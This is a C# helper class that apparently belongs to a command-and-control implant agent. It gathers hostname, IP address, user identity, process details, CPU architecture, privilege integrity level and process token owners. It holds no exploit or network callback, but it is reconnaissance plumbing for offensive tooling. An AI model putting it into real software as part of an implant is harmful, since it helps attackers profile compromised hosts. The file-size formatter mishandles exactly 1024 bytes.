using Shared.Models;

using System;
using System.Diagnostics;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Security.Principal;

using static Agent.PInvoke.NativeMethods;

namespace Agent.Utilities
{
    public class Helpers
    {
        public static string GetHostname
        {
            get
            {
                return Dns.GetHostName();
            }
        }

        public static string GetIPAddress
        {
            get
            {
                return Dns.GetHostEntry(Dns.GetHostName()).AddressList.FirstOrDefault(a => a.AddressFamily == AddressFamily.InterNetwork).ToString();
            }
        }

        public static string GetIdentity
        {
            get
            {
                return WindowsIdentity.GetCurrent().Name;
            }
        }

        public static string GetProcessName
        {
            get
            {
                return Process.GetCurrentProcess().ProcessName;
            }
        }

        public static int GetProcessID
        {
            get
            {
                return Process.GetCurrentProcess().Id;
            }
        }

        public static Native.Platform GetArchitecture
        {
            get
            {
                const ushort PROCESSOR_ARCHITECTURE_INTEL = 0;
                const ushort PROCESSOR_ARCHITECTURE_IA64 = 6;
                const ushort PROCESSOR_ARCHITECTURE_AMD64 = 9;

                var sysInfo = new SYSTEM_INFO();
                Kernel32.GetNativeSystemInfo(ref sysInfo);

                switch (sysInfo.wProcessorArchitecture)
                {
                    case PROCESSOR_ARCHITECTURE_AMD64:
                        return Native.Platform.x64;
                    case PROCESSOR_ARCHITECTURE_INTEL:
                        return Native.Platform.x86;
                    case PROCESSOR_ARCHITECTURE_IA64:
                        return Native.Platform.IA64;
                    default:
                        return Native.Platform.Unknown;
                }
            }
        }

        public static AgentMetadata.Integrity GetIntegrity
        {
            get
            {
                var integrity = AgentMetadata.Integrity.Medium;
                var identity = WindowsIdentity.GetCurrent();

                if (Environment.UserName.Equals("SYSTEM", StringComparison.OrdinalIgnoreCase))
                {
                    integrity = AgentMetadata.Integrity.SYSTEM;
                }
                else if (identity.User != identity.Owner)
                {
                    integrity = AgentMetadata.Integrity.High;
                }

                return integrity;
            }
        }

        public static string ConvertFileLength(long size)
        {
            var result = size.ToString();

            if (size < 1024) { result = $"{size}b"; }
            else if (size > 1024 && size <= 1048576) { result = $"{size / 1024}kb"; }
            else if (size > 1048576 && size <= 1073741824) { result = $"{size / 1048576}mb"; }
            else if (size > 1073741824 && size <= 1099511627776) { result = $"{size / 1073741824}gb"; }
            else if (size > 1099511627776) { result = $"{size / 1099511627776}tb"; }

            return result;
        }

        public static string GetProcessOwner(Process Process)
        {
            try
            {
                Kernel32.OpenProcessToken(Process.Handle, DesiredAccess.TOKEN_QUERY, out IntPtr handle);

                using (var winIdentity = new WindowsIdentity(handle))
                {
                    return winIdentity.Name;
                }
            }
            catch
            {
                return string.Empty;
            }
        }
    }
}